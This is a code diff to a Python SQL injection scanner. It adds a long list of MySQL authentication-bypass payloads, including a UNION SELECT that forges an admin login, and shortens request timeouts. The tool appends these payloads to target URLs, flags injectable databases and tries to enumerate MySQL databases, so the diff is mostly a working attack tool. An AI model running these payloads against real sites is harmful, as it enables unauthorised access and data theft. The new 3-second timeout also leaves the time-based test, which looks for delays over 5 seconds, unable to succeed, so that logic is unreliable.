@@ -17,6 +17,83 @@ headers = {
 
 payloads = {
     "MySQL": [
+        "'-'",
+        "' '",
+        "'&'",
+        "'^'",
+        "'*'",
+        "' or ''-'",
+        "' or '' '",
+        "' or ''&'",
+        "' or ''^'",
+        "' or ''*'",
+        "\"-\"",
+        "\" \"",
+        "\"&\"",
+        "\"^\"",
+        "\"*\"",
+        "\" or \"\"-\"",
+        "\" or \"\" \"",
+        "\" or \"\"&\"",
+        "\" or \"\"^\"",
+        "\" or \"\"*\"",
+        "or true--",
+        "\" or true--\"",
+        "' or true--'",
+        "\") or true--",
+        "') or true--'",
+        "' or 'x'='x",
+        "') or ('x')=('x",
+        "')) or (('x'))=(('x",
+        "\" or \"x\"=\"x",
+        "\") or (\"x\")=(\"x",
+        "')) or (('x'))=(('x",
+        "or 1=1",
+        "or 1=1--",
+        "or 1=1#",
+        "or 1=1/*",
+        "admin' --",
+        "admin' #",
+        "admin'/*",
+        "admin' or '1'='1",
+        "admin' or '1'='1'--",
+        "admin' or '1'='1'#",
+        "admin' or '1'='1'/*",
+        "admin'or 1=1 or ''='",
+        "admin' or 1=1",
+        "admin' or 1=1--",
+        "admin' or 1=1#",
+        "admin' or 1=1/*",
+        "admin') or ('1'='1",
+        "admin') or ('1'='1'--",
+        "admin') or ('1'='1'#",
+        "admin') or ('1'='1'/*",
+        "admin') or '1'='1",
+        "admin') or '1'='1'--",
+        "admin') or '1'='1'#",
+        "admin') or '1'='1'/*",
+        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
+        "admin\" --",
+        "admin\" #",
+        "admin\"/*",
+        "admin\" or \"1\"=\"1",
+        "admin\" or \"1\"=\"1\"--",
+        "admin\" or \"1\"=\"1\"#",
+        "admin\" or \"1\"=\"1\"/*",
+        "admin\"or 1=1 or \"\"=\"",
+        "admin\" or 1=1",
+        "admin\" or 1=1--",
+        "admin\" or 1=1#",
+        "admin\" or 1=1/*",
+        "admin\") or (\"1\"=\"1",
+        "admin\") or (\"1\"=\"1\"--",
+        "admin\") or (\"1\"=\"1\"#",
+        "admin\") or (\"1\"=\"1\"/*",
+        "admin\") or \"1\"=\"1",
+        "admin\") or \"1\"=\"1\"--",
+        "admin\") or \"1\"=\"1\"#",
+        "admin\") or \"1\"=\"1\"/*",
+        "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\"",
         "' OR 1=1 -- ",
         "' OR 'a'='a",
         "' OR '1'='1",
@@ -339,7 +416,7 @@ def get_mysql_databases(url):
     for payload in payloads:
         full_url = f"{url}{payload}"
         try:
-            response = requests.get(full_url, timeout=10)
+            response = requests.get(full_url, timeout=3)
             if "information_schema" in response.text.lower():
                 print(f"{GREEN}[MYSQL DATABASES FOUND]{RESET} {BOLD}Possible databases:{RESET}")
                 matches = re.findall(r'([a-zA-Z0-9_]+)', response.text)
@@ -362,7 +439,7 @@ def test_sqli_time_based(url):
         start_time = time.time()
         full_url = f"{url}{payload}"
         try:
-            response = requests.get(full_url, timeout=10)
+            response = requests.get(full_url, timeout=3)
             end_time = time.time()
             duration = end_time - start_time
             if duration > 5:
@@ -381,7 +458,7 @@ def test_sqli(url):
         for payload in db_payloads:
             full_url = f"{url}{payload}"
             try:
-                response = requests.get(full_url, timeout=10)
+                response = requests.get(full_url, timeout=3)
                 db_type = detect_db_vulnerability(response.text)
                 if db_type:
                     print(f"{GREEN}[VULNERABLE]{RESET} {BOLD}SQL Injection found{RESET} with payload: {YELLOW}{payload}{RESET} on {BOLD}{db_type}{RESET} database!")
@@ -421,7 +498,6 @@ def process_urls(urls):
             test_sqli(url)
 
 def main():
-
     choice = input(f"{BOLD}{CYAN}Do you want to test a single URL (1) or multiple URLs from a file (2)? Enter 1 or 2: {RESET}")
 
     if choice == "1":
